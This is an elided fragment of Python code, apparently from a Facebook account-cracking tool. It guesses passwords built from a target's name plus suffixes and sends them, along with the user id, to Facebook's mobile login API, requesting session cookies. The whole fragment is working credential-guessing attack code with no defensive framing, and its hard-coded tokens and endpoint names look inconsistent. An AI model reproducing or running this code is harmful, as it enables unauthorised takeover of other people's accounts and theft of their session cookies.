        ...
        try:
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    pass3 = name.lower() + p3
                    data = requests.get("https://b-api.facebook.com/method/auth_login?access_token=2140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&emall=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=1d1d5c", headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        ...
                        pass4 = name.lower() + p4
                        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=2377599C0f140aabedfb65ac271&format=json&sdk_version=2&emall=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=1705c", headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
